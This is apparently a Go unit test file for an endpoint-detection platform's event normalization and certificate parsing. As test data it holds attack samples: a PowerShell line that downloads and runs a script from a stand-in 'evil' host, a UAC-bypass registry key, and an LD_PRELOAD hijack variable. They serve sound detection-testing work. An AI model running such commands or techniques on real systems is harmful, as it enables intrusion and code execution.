package ingestion

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"math/big"
	"strings"
	"testing"
	"time"

	v1 "github.com/edr-platform/proto/agent/v1"
)

// ─── enum stringers ─────────────────────────────────────────────────────────

func TestEventTypeString(t *testing.T) {
	cases := map[v1.EventType]string{
		v1.EventType_EVENT_TYPE_PROCESS:     "process",
		v1.EventType_EVENT_TYPE_FILE:        "file",
		v1.EventType_EVENT_TYPE_NETWORK:     "network",
		v1.EventType_EVENT_TYPE_DNS:         "dns",
		v1.EventType_EVENT_TYPE_REGISTRY:    "registry",
		v1.EventType_EVENT_TYPE_AUTH:        "auth",
		v1.EventType_EVENT_TYPE_UNSPECIFIED: "",
	}
	for in, want := range cases {
		if got := eventTypeString(in); got != want {
			t.Errorf("eventTypeString(%v): got %q, want %q", in, got, want)
		}
	}
}

func TestPlatformString(t *testing.T) {
	cases := map[v1.Platform]string{
		v1.Platform_PLATFORM_LINUX:       "linux",
		v1.Platform_PLATFORM_WINDOWS:     "windows",
		v1.Platform_PLATFORM_DARWIN:      "darwin",
		v1.Platform_PLATFORM_UNSPECIFIED: "unknown",
	}
	for in, want := range cases {
		if got := platformString(in); got != want {
			t.Errorf("platformString(%v): got %q, want %q", in, got, want)
		}
	}
}

func TestProcessActionString(t *testing.T) {
	cases := map[v1.ProcessEvent_ProcessAction]string{
		v1.ProcessEvent_PROCESS_ACTION_CREATE:      "create",
		v1.ProcessEvent_PROCESS_ACTION_TERMINATE:   "terminate",
		v1.ProcessEvent_PROCESS_ACTION_INJECT:      "inject",
		v1.ProcessEvent_PROCESS_ACTION_HOLLOW:      "hollow",
		v1.ProcessEvent_PROCESS_ACTION_UNSPECIFIED: "existing",
	}
	for in, want := range cases {
		if got := processActionString(in); got != want {
			t.Errorf("processActionString(%v): got %q, want %q", in, got, want)
		}
	}
}

// ─── normalizeEventData ─────────────────────────────────────────────────────

func unmarshal(t *testing.T, b []byte) map[string]interface{} {
	t.Helper()
	var m map[string]interface{}
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatalf("normalizeEventData produced invalid JSON object: %v (%s)", err, b)
	}
	return m
}

func TestNormalize_Process(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_PROCESS,
		Payload: &v1.Event_Process{Process: &v1.ProcessEvent{
			ProcessName: "powershell.exe",
			Pid:         42,
			Ppid:        7,
			CommandLine: "-enc AAA",
			ImagePath:   `C:\Windows\powershell.exe`,
			Username:    "admin",
			Action:      v1.ProcessEvent_PROCESS_ACTION_CREATE,
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["process_name"] != "powershell.exe" || m["command_line"] != "-enc AAA" {
		t.Errorf("process fields not normalized: %+v", m)
	}
	if m["image_path"] != `C:\Windows\powershell.exe` {
		t.Errorf("image_path wrong: %v", m["image_path"])
	}
	if m["pid"] != float64(42) {
		t.Errorf("pid should be 42, got %v", m["pid"])
	}
	if m["action"] != "create" {
		t.Errorf("action should stringify to create, got %v", m["action"])
	}
}

// process_block decisions arrive as EVENT_TYPE_LOG with the payload encoded in
// the event ID; normalizeEventData must decode the inner JSON (regression guard
// for the silently-dropped process_block gap found 2026-06-19).
func TestNormalize_ProcessBlock(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_LOG,
		Id:   `process_block:abc-123:{"process_name":"/tmp/blockme","pid":4242,"action":"audit","rule_id":"r1","rule_name":"deny-x","severity":"high"}`,
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["process_name"] != "/tmp/blockme" || m["action"] != "audit" || m["rule_name"] != "deny-x" {
		t.Errorf("process_block payload not decoded: %+v", m)
	}
	if m["pid"] != float64(4242) {
		t.Errorf("pid should be 4242, got %v", m["pid"])
	}
}

// Hashes must be lifted onto the normalized event so hash-based IOC matching
// (known-malware detection) can fire. Regression guard: previously dropped.
func TestNormalize_ProcessHashes(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_PROCESS,
		Payload: &v1.Event_Process{Process: &v1.ProcessEvent{
			ProcessName: "evil.exe",
			Hashes:      &v1.FileHashes{Md5: "d41d8cd98f00b204e9800998ecf8427e", Sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["sha256"] != "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" {
		t.Errorf("process sha256 not lifted: %v", m["sha256"])
	}
	if m["md5"] != "d41d8cd98f00b204e9800998ecf8427e" {
		t.Errorf("process md5 not lifted: %v", m["md5"])
	}
}

func TestNormalize_FileHashes(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_FILE,
		Payload: &v1.Event_File{File: &v1.FileEvent{
			Path:   `C:\Users\v\dropper.exe`,
			Action: v1.FileEvent_FILE_ACTION_CREATE,
			Hashes: &v1.FileHashes{Sha256: "abc123"},
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["sha256"] != "abc123" {
		t.Errorf("file sha256 not lifted: %v", m["sha256"])
	}
}

// Nil/empty hashes must not add empty keys.
func TestNormalize_NoHashesWhenAbsent(t *testing.T) {
	evt := &v1.Event{
		Type:    v1.EventType_EVENT_TYPE_PROCESS,
		Payload: &v1.Event_Process{Process: &v1.ProcessEvent{ProcessName: "x.exe"}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if _, ok := m["sha256"]; ok {
		t.Errorf("sha256 key should be absent when no hashes present")
	}
}

func TestNormalize_NetworkDirection(t *testing.T) {
	inbound := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_NETWORK,
		Payload: &v1.Event_Network{Network: &v1.NetworkEvent{
			SrcIp: "10.0.0.1", DstIp: "10.0.0.2",
			Direction: v1.NetworkEvent_NETWORK_DIRECTION_INBOUND,
		}},
	}
	if m := unmarshal(t, normalizeEventData(inbound)); m["direction"] != "inbound" {
		t.Errorf("expected inbound direction, got %v", m["direction"])
	}
	// No direction set → defaults to outbound.
	outbound := &v1.Event{
		Type:    v1.EventType_EVENT_TYPE_NETWORK,
		Payload: &v1.Event_Network{Network: &v1.NetworkEvent{SrcIp: "10.0.0.1", DstIp: "8.8.8.8"}},
	}
	m := unmarshal(t, normalizeEventData(outbound))
	if m["direction"] != "outbound" {
		t.Errorf("expected outbound default, got %v", m["direction"])
	}
	if m["dst_ip"] != "8.8.8.8" {
		t.Errorf("dst_ip not normalized: %v", m["dst_ip"])
	}
}

func TestNormalize_DNS(t *testing.T) {
	evt := &v1.Event{
		Type:    v1.EventType_EVENT_TYPE_DNS,
		Payload: &v1.Event_Dns{Dns: &v1.DnsEvent{Query: "evil.example.com", QueryType: "A"}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["query"] != "evil.example.com" || m["query_type"] != "A" {
		t.Errorf("dns fields not normalized: %+v", m)
	}
}

// Registry events must normalize to flat fields (previously hit the default
// raw-marshal path). keyPath drives the Sigma UAC-bypass registry-hijack rule.
func TestNormalize_Registry(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_REGISTRY,
		Payload: &v1.Event_Registry{Registry: &v1.RegistryEvent{
			KeyPath:   `HKCU\Software\Classes\ms-settings\shell\open\command`,
			ValueData: `C:\evil.exe`,
			Action:    v1.RegistryEvent_REGISTRY_ACTION_CREATE,
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["key_path"] != `HKCU\Software\Classes\ms-settings\shell\open\command` || m["keyPath"] == nil {
		t.Errorf("registry key_path not normalized: %+v", m)
	}
	if m["operation"] != "create" {
		t.Errorf("registry operation should be create, got %v", m["operation"])
	}
}

// Auth events must normalize to flat fields (previously hit the default path).
func TestNormalize_Auth(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_AUTH,
		Payload: &v1.Event_Auth{Auth: &v1.AuthEvent{
			Username: "admin", SourceIp: "10.0.0.5",
			Action: v1.AuthEvent_AUTH_ACTION_FAILED, Success: false,
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["username"] != "admin" || m["source_ip"] != "10.0.0.5" {
		t.Errorf("auth fields not normalized: %+v", m)
	}
	if m["action"] != "failed" {
		t.Errorf("auth action should be failed, got %v", m["action"])
	}
	// An auth event without a LogonType must not carry the key (keeps non-Windows
	// auth unchanged and the off-hours-login UEBA feature dormant for them).
	if _, ok := m["logon_type"]; ok {
		t.Errorf("logon_type should be absent when unset, got %v", m["logon_type"])
	}
}

// TestNormalize_AuthLogonType guards the T1078 wiring: a Windows 4624/4625
// LogonType must reach the flat map as logon_type, which is what activates the
// off-hours-login UEBA feature (alert_pipeline login_hour sample) and the Sigma
// LogonType rules. It was previously never emitted (dead feature).
func TestNormalize_AuthLogonType(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_AUTH,
		Payload: &v1.Event_Auth{Auth: &v1.AuthEvent{
			Username: "admin", SourceIp: "10.0.0.5",
			Action: v1.AuthEvent_AUTH_ACTION_LOGIN, Success: true,
			LogonType: "10", // RemoteInteractive / RDP
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["logon_type"] != "10" {
		t.Errorf("logon_type not normalized, got %v (full=%+v)", m["logon_type"], m)
	}
}

// Agent-side detection signals must be surfaced, not dropped.
func TestNormalize_AgentSignals(t *testing.T) {
	// File YARA hit.
	fileEvt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_FILE,
		Payload: &v1.Event_File{File: &v1.FileEvent{
			Path: `C:\m.exe`, YaraMatched: true, YaraRuleIds: []string{"win_mal_x"},
		}},
	}
	if m := unmarshal(t, normalizeEventData(fileEvt)); m["yara_matched"] != true {
		t.Errorf("file yara_matched should be surfaced: %+v", m)
	}
	// DNS suspicion flag.
	dnsEvt := &v1.Event{
		Type:    v1.EventType_EVENT_TYPE_DNS,
		Payload: &v1.Event_Dns{Dns: &v1.DnsEvent{Query: "x.com", IsSuspicious: true}},
	}
	if m := unmarshal(t, normalizeEventData(dnsEvt)); m["is_suspicious"] != true {
		t.Errorf("dns is_suspicious should be surfaced: %+v", m)
	}
	// Network threat-intel verdict.
	netEvt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_NETWORK,
		Payload: &v1.Event_Network{Network: &v1.NetworkEvent{
			DstIp: "1.2.3.4", ThreatIntel: &v1.ThreatIntelHit{Matched: true, Source: "abuse.ch", Category: "c2"},
		}},
	}
	if m := unmarshal(t, normalizeEventData(netEvt)); m["threat_intel_matched"] != true || m["threat_intel_category"] != "c2" {
		t.Errorf("network threat_intel should be surfaced: %+v", m)
	}
}

// Image-load events normalize to ImageLoaded/SignatureStatus-driving flat keys.
func TestNormalize_ImageLoad(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_IMAGE_LOAD,
		Payload: &v1.Event_ImageLoad{ImageLoad: &v1.ImageLoadEvent{
			ImagePath:       `C:\Users\v\AppData\Local\Temp\version.dll`,
			ProcessName:     "legit.exe",
			Signed:          false,
			SignatureStatus: "unsigned",
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["image_loaded"] != `C:\Users\v\AppData\Local\Temp\version.dll` {
		t.Errorf("image_loaded not normalized: %+v", m)
	}
	if m["signature_status"] != "unsigned" {
		t.Errorf("signature_status not normalized: %v", m["signature_status"])
	}
}

// Script events normalize to ScriptBlockText-driving flat keys.
func TestNormalize_Script(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_SCRIPT,
		Payload: &v1.Event_Script{Script: &v1.ScriptContentEvent{
			Engine:      "powershell",
			Content:     `IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')`,
			ProcessName: "powershell.exe",
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["script_block_text"] == nil || m["engine"] != "powershell" {
		t.Errorf("script fields not normalized: %+v", m)
	}
}

// Process env_vars (LD_PRELOAD etc.) must surface as env_vars + a joined
// `environment` string for dynamic-linker-hijacking detection.
func TestNormalize_ProcessEnv(t *testing.T) {
	evt := &v1.Event{
		Type: v1.EventType_EVENT_TYPE_PROCESS,
		Payload: &v1.Event_Process{Process: &v1.ProcessEvent{
			ProcessName: "bash",
			EnvVars:     []string{"LD_PRELOAD=/tmp/evil.so", "PATH=/usr/bin"},
		}},
	}
	m := unmarshal(t, normalizeEventData(evt))
	env, _ := m["environment"].(string)
	if !strings.Contains(env, "LD_PRELOAD=/tmp/evil.so") {
		t.Errorf("environment should contain LD_PRELOAD, got %q", env)
	}
}

func TestNormalize_FIMChangeID(t *testing.T) {
	// FIM events encode their payload in the ID field as "fim_change:<uuid>:<json>".
	evt := &v1.Event{
		Id:   `fim_change:abc-123:{"path":"/etc/passwd","change":"modified"}`,
		Type: v1.EventType_EVENT_TYPE_FILE,
	}
	m := unmarshal(t, normalizeEventData(evt))
	if m["path"] != "/etc/passwd" || m["change"] != "modified" {
		t.Errorf("fim_change payload not unpacked from ID: %+v", m)
	}
}

func TestNormalize_ProcessStatsID(t *testing.T) {
	// process_stats:<uuid>:<json-array> returns the raw array unchanged.
	evt := &v1.Event{
		Id:   `process_stats:xyz:[{"pid":1,"cpu":5}]`,
		Type: v1.EventType_EVENT_TYPE_UNSPECIFIED,
	}
	out := normalizeEventData(evt)
	var arr []map[string]interface{}
	if err := json.Unmarshal(out, &arr); err != nil {
		t.Fatalf("expected a JSON array, got %s (%v)", out, err)
	}
	if len(arr) != 1 || arr[0]["pid"] != float64(1) {
		t.Errorf("process_stats array not passed through: %s", out)
	}
}

func TestNormalize_NilPayload(t *testing.T) {
	// Process type with no payload → empty object, not a panic.
	evt := &v1.Event{Type: v1.EventType_EVENT_TYPE_PROCESS}
	m := unmarshal(t, normalizeEventData(evt))
	if len(m) != 0 {
		t.Errorf("nil payload should normalize to empty object, got %+v", m)
	}
}

// ─── parseCertNotAfter ──────────────────────────────────────────────────────

func TestParseCertNotAfter(t *testing.T) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatalf("key: %v", err)
	}
	notAfter := time.Now().Add(90 * 24 * time.Hour).Truncate(time.Second)
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "agent-test"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     notAfter,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatalf("cert: %v", err)
	}
	pemStr := string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}))

	got, err := parseCertNotAfter(pemStr)
	if err != nil {
		t.Fatalf("parseCertNotAfter: %v", err)
	}
	if !got.Equal(notAfter.UTC()) && !got.Equal(notAfter) {
		t.Errorf("NotAfter mismatch: got %v, want %v", got, notAfter)
	}

	if _, err := parseCertNotAfter("not a pem"); err == nil {
		t.Error("expected error on non-PEM input")
	}
	if _, err := parseCertNotAfter(string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: []byte("garbage")}))); err == nil {
		t.Error("expected error on invalid certificate bytes")
	}
}
